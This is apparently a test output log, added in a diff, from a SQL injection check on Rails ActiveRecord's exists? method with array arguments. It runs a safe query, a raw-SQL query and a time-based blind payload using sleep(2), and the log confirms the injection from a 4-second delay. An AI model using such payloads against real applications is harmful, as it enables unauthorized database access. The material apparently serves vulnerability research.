@@ -1,0 +1,64 @@
+Note: no implicit conversion of String into Integer
+================================================================================
+Basic SQL Injection Test - ActiveRecord exists?
+================================================================================
+
+TEST 1: Safe exists? with hash parameter
+----------------------------------------
+Code: TestUser.exists?(id: 1)
+Parameter: {id: 1} (hash - safe, parameterized)
+
+Result: true
+Status: PASS - Safe parameterized query works
+
+Expected SQL: SELECT 1 AS one FROM test_users WHERE test_users.id = 1 LIMIT 1
+              (Parameterized - safe from SQL injection)
+
+
+TEST 2: Vulnerable exists? with array parameter (SQL injection)
+----------------------------------------------------------------
+Code: TestUser.exists?(["id = 1"])
+Parameter: ["id = 1"] (array without hash key - VULNERABLE)
+
+Payload array: ["id = 1"]
+First element: "id = 1"
+
+Result: true
+
+Expected SQL: SELECT 1 AS one FROM test_users WHERE (id = 1) LIMIT 1
+              (Raw SQL interpolation - VULNERABLE to injection)
+
+Status: PASS - SQL injection vulnerability confirmed
+         The array parameter is interpolated directly into SQL without escaping
+
+
+TEST 3: SQL injection with sleep() - time-based blind
+-----------------------------------------------------
+Code: TestUser.exists?(["'test') OR sleep(2) OR ('x'"])
+Parameter: ["'test') OR sleep(2) OR ('x'"] (malicious payload)
+
+Payload array: ["'test') OR sleep(2) OR ('x'"]
+First element: "'test') OR sleep(2) OR ('x'"
+
+Expected SQL: SELECT 1 AS one FROM test_users WHERE ('test') OR sleep(2) OR ('x') LIMIT 1
+              (sleep(2) will execute if injection works)
+
+Executing query...
+
+Result: false
+Elapsed time: 4.18s
+
+Status: PASS - sleep() executed, confirming SQL injection
+         Query took ~4.18s (expected ~2s) - sleep() worked!
+
+
+================================================================================
+SUMMARY
+================================================================================
+✓ Basic SQL injection via exists? with array parameter: CONFIRMED
+✓ Time-based blind injection (sleep): CONFIRMED
+
+This confirms the vulnerability exists before testing multi-statements.
+
+---
+Exit status: 0
